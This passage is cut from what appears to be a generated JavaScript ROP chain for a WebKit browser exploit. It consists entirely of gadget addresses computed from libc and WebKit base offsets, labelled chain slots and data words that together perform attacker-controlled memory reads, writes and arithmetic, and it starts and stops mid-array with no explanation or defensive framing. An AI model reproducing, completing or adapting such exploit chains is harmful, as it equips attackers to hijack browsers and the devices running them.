libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+115192, //L1298
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1298:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+115272, //L1302
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1302:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1300:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1301:
db([27, 0]); // 0x1b
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+115376, //L1303
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+115392, //L1304
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1303:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1304:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+115480, //L1306
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1306:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+115536, //L1307
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1307:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+115608, //L1310
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1310:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+115664, //L1312
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1312:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+115752, //L1313
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1313:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1314:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+115856, //L1316
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+115872, //L1317
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1316:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1317:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+116016, //L1321
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+115984, //L1319
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+116000, //L1320
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1319:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1320:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1321:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+116088, //L1323
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1323:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+116144, //L1324
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1324:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+116224, //L1328
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1328:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1326:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1327:
db([3, 0]); // 0x3
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+116328, //L1329
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+116344, //L1330
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1329:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1330:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+116432, //L1332
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1332:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+116488, //L1333
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1333:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+116592, //L1335
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1335:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1336:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+116696, //L1338
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+116712, //L1339
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1338:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1339:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+116856, //L1343
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+116824, //L1341
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+116840, //L1342
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1341:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1342:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1343:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+116928, //L1345
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1345:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+116984, //L1346
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1346:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+117064, //L1350
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1350:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1348:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1349:
db([28, 0]); // 0x1c
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+117168, //L1351
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+117184, //L1352
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1351:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1352:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+117272, //L1354
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1354:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+117328, //L1355
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1355:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+117400, //L1358
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1358:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+117456, //L1360
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1360:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1361:
webkit_base+1026352, //mov [rdi + 0x10], r9
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+117592, //L1362
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1362:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1363:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+117696, //L1365
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+117712, //L1366
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1365:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1366:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+117856, //L1370
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+117824, //L1368
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+117840, //L1369
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1368:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1369:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1370:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+117928, //L1372
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1372:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+117984, //L1373
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1373:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+118064, //L1377
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1377:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1375:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1376:
db([29, 0]); // 0x1d
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+118168, //L1378
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+118184, //L1379
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1378:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1379:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+118272, //L1381
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1381:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+118328, //L1382
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1382:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+118400, //L1385
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1385:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+118456, //L1387
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1387:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1388:
libc_base+206806, //pop rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+118592, //L1389
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1389:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1390:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+118696, //L1392
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+118712, //L1393
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1392:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1393:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+118856, //L1397
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+118824, //L1395
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+118840, //L1396
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1395:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1396:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1397:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+118928, //L1399
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1399:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+118984, //L1400
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1400:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+119064, //L1404
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1404:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1402:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1403:
db([30, 0]); // 0x1e
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+119168, //L1405
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+119184, //L1406
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1405:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1406:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+119272, //L1408
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1408:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+119328, //L1409
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1409:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+119400, //L1412
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1412:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+119456, //L1414
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1414:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+119544, //L1415
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1415:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1416:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+119648, //L1418
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+119664, //L1419
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1418:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1419:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+119808, //L1423
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+119776, //L1421
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+119792, //L1422
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1421:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1422:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1423:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+119880, //L1425
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1425:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+119936, //L1426
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1426:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+120016, //L1430
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1430:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1428:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1429:
db([7, 0]); // 0x7
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+120120, //L1431
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+120136, //L1432
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1431:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1432:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+120224, //L1434
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1434:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+120280, //L1435
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1435:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+120384, //L1437
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1437:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1438:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+120488, //L1440
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+120504, //L1441
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1440:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1441:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+120648, //L1445
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+120616, //L1443
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+120632, //L1444
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1443:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1444:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1445:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+120720, //L1447
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1447:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+120776, //L1448
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1448:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+120856, //L1452
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1452:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1450:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1451:
db([31, 0]); // 0x1f
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+120960, //L1453
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+120976, //L1454
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1453:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1454:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+121064, //L1456
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1456:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+121120, //L1457
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1457:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+121192, //L1460
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1460:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+121248, //L1462
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
